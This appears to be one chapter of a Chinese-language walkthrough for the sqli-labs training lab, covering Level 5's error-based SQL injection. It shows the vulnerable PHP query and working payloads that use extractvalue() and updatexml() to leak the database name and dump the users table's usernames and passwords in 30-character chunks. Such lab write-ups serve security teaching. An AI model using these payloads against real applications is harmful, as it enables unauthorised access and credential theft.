# Less-5

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | GET · 报错盲注 |
| **闭合方式** | `'` |
| **注释符** | `--+ · GET 地址栏直接可用` |
| **成败信号** | You are in / SQL 报错 |
| **一句话** | 不回显数据，用报错函数 |
| **核心 payload** | `?id=1' and extractvalue(1,concat(0x7e,database()))--+` |

---

**GET · 报错型盲注（双注入）· 单引号**

### 源码

```php
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
if($row) { echo 'You are in...........'; }   // 只输出这句话！
else     { echo mysql_error(); }             // 失败时输出报错
```

### 特点：不回显数据

用 UNION 试试就知道，页面永远只有 `You are in...........`：

```
?id=-1' union select 1,2,3--+     →  You are in...........（看不到 1,2,3）
```

因为 PHP 里根本没写 `echo $row['username']`。既然**显示位没了**，就改用**报错位**——把数据塞进报错信息里。

### 通关 payload（实测）

`extractvalue()` / `updatexml()` 的第二个参数必须是合法的 XPath，我们故意传 `~security` 这种非法值，MySQL 就会把这段内容当成错误抛出来：

```
?id=1' and extractvalue(1,concat(0x7e,database()))--+
→ XPATH syntax error: '~security'
```

取版本、用户名同理。整表拖库：

```
?id=1' and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),1)--+
→ XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'
```

> ⚠️ 只显示了 `D` 就断了，因为 **updatexml 报错最多输出 32 字节**。要完整数据用 `substr()` 分段：
> ```
> ?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,30)),1)--+
> ?id=1' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),31,30)),1)--+
> ```
> 每次往后挪 30 个字符，直到取完。

---

[← Less-4](Less-04.md) ｜ [返回目录](README.md) ｜ [Less-6 →](Less-06.md)